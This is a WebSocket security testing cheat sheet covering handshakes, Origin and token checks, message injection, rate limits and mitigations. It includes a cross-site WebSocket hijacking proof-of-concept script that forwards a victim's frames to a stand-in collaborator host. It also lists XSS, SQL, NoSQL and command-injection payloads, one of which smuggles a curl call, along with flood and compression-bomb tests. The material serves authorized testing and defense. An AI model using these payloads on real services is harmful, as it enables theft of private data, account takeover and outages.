# 🔌 WebSockets Security Cheat Sheet
> **Scope:** Authorized testing only. Test sockets you own or that are explicitly in scope. WebSocket frames drive real state changes (messages, payments, admin actions) — avoid destructive actions on shared/live users.

---
## ⚡ Quick Reference
| Check | Look for | Test |
|-------|----------|------|
| **Handshake** | `101 Switching Protocols`, `Upgrade: websocket` | Replay with modified headers |
| **Transport** | `ws://` vs `wss://` | Cleartext credentials/tokens? |
| **Origin check** | `Origin` validated on upgrade | External/null/missing origin |
| **Auth** | Cookie/JWT on upgrade **and** messages | Stale/no token |
| **Message authz** | Per-channel/object checks | Another user's resource ID |
| **Input handling** | JSON schema, output encoding | Markup, commands, SQL/NoSQL |
| **Limits** | Frame size, rate, connections | Flood, huge frames, many sockets |

---
## 🤝 The Handshake
```http
GET /<PATH> HTTP/1.1
Host: <HOST>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://<HOST>
Cookie: session=<TOKEN>
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: <HASH>
```

| Header | Security relevance |
|--------|--------------------|
| `Origin` | Must be validated to stop CSWSH |
| `Sec-WebSocket-Key` | Handshake nonce, **not** an auth control |
| `Sec-WebSocket-Protocol` | Subprotocol; sometimes carries tokens |
| `Cookie` / `Authorization` | Token carriers — test upgrade and frames |
| `Sec-WebSocket-Extensions` | `permessage-deflate` enables compression attacks |

> Client→server frames are masked (RFC 6455); Burp unmasks them automatically.

---
## 🕵️ Intercepting WS Traffic
1. Trigger the connection in the browser; open **Proxy → WebSockets history**.
2. Enable **Settings → Proxy → Intercept WebSocket messages** to edit frames live.
3. Right-click a frame → **Send to Repeater**; replay/modify in the Repeater **WebSocket** tab.
4. Use **Collaborator** (`<COLLAB>`) as an OOB sink for injected payloads.

```bash
wscat -c wss://<HOST>/<PATH> -H 'Cookie: session=<TOKEN>'
websocat -H='Origin: https://attacker.example' wss://<HOST>/<PATH>
```

---
## 🔐 Authentication & Session Testing
| Scenario | Expected | Fail indicator |
|----------|----------|----------------|
| Upgrade without cookie/JWT | `401`/`403` | `101` issued |
| Replay logged-out token | Rejected | Data still streams |
| Token in query string | Rejected | `?token=<TOKEN>` accepted/logged |
| Subscribe to another channel | `403` | Other user's messages |
| External `Origin` | Rejected | `101` still issued |
| `Origin: null` / missing | Rejected | Accepted |

```http
GET /<PATH>?token=<TOKEN> HTTP/1.1
Host: <HOST>
Origin: null
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

> Authorize **every message**, not only the upgrade: a low-privilege socket must not send admin-only frames.

---
## 🧨 Cross-Site WebSocket Hijacking (CSWSH)
No/weak Origin validation + cookie-authenticated socket = a malicious page opens a socket as the victim.

```html
<!-- Hosted at https://<EXPLOIT_SERVER>/cs.html -->
<script>
const ws = new WebSocket('wss://<HOST>/<PATH>');
ws.onopen = () => ws.send('{"type":"subscribe","userId":"<USER_ID>"}');
ws.onmessage = e =>
  fetch('https://<COLLAB>/?d=' + encodeURIComponent(e.data));
</script>
```

Log in as victim → open exploit page → watch `<COLLAB>` for frames. Try `Origin` variants: external domain, `null`, subdomain, case changes, omitted header.

---
## 💉 Message Injection
```json
{"type":"message","to":"<USER_ID>","body":"<img src=x onerror=alert(1)>"}
{"type":"transfer","amount":-100,"currency":"USD"}
{"type":"subscribe","channel":"../../admin/<PATH>"}
{"type":"admin","action":"delete","id":"<OBJECT_ID>"}
{"type":"search","q":"' OR '1'='1"}
{"type":"lookup","id":{"$ne":null}}
{"type":"cmd","file":"<PATH>; id"}
{"type":"ping","host":"<HOST> && curl http://<COLLAB>"}
```

*Fuzz every field: type confusion (`id: []` vs `1`), negative/large numbers, unknown `type`, missing/duplicate keys, Unicode and control characters.*

---
## ⏱️ Rate Limits & DoS
| Test | Method | Risk |
|------|--------|------|
| Message flood | 1,000 frames in a loop | CPU/DB exhaustion |
| Oversized frame | 10–100 MB payload | Memory exhaustion |
| Compression bomb | Compressible `permessage-deflate` data | Decompression blowup |
| Ping/pong flood | Rapid control frames | Event-loop starvation |
| Connection exhaustion | Hundreds of sockets | FD/memory limits |

*Send bursts with `wscat`/a small script, cap the loop, and clean up sockets; use only on your own instance.*

---
## 💥 Impact
Private chat/notification leakage · account takeover via hijacked frames · stored XSS in raw HTML renderers · business-logic abuse (negative amounts, state skipping) · service degradation.

---
## 🛡️ Mitigation
- Validate `Origin` against an allowlist on every upgrade; reject `null`.
- Authenticate the upgrade **and** authorize every message per user/object.
- Use short-lived single-use tickets instead of credentials in URLs; never log tokens.
- Strict JSON schemas, type checks, output encoding, safe DOM rendering.
- Disable `permessage-deflate` or cap decompressed size; limit frame/message size.
- Per-connection and per-user rate limits plus global connection caps.
- Require `wss://` with valid TLS; short idle timeouts.

---
## ✅ Testing Checklist
- [ ] Scope and authorization confirmed
- [ ] Handshake request and `101` response captured
- [ ] `ws://` vs `wss://` token leakage checked
- [ ] Unauthenticated/stale-token upgrades tried
- [ ] Origin mutated (external, `null`, missing)
- [ ] Per-message authorization tested with other user IDs
- [ ] Schema/type/injection and XSS rendering tested
- [ ] CSWSH PoC delivered via exploit server with `<COLLAB>`
- [ ] Limits tested safely; no real tokens or user data recorded

---
## 📚 References
- [RFC 6455 — The WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455)
- [PortSwigger — WebSockets vulnerabilities](https://portswigger.net/web-security/websockets)
- [OWASP — WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [MDN — Writing WebSocket servers](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers)

---
**🔌 Happy (authorized) socket testing!**
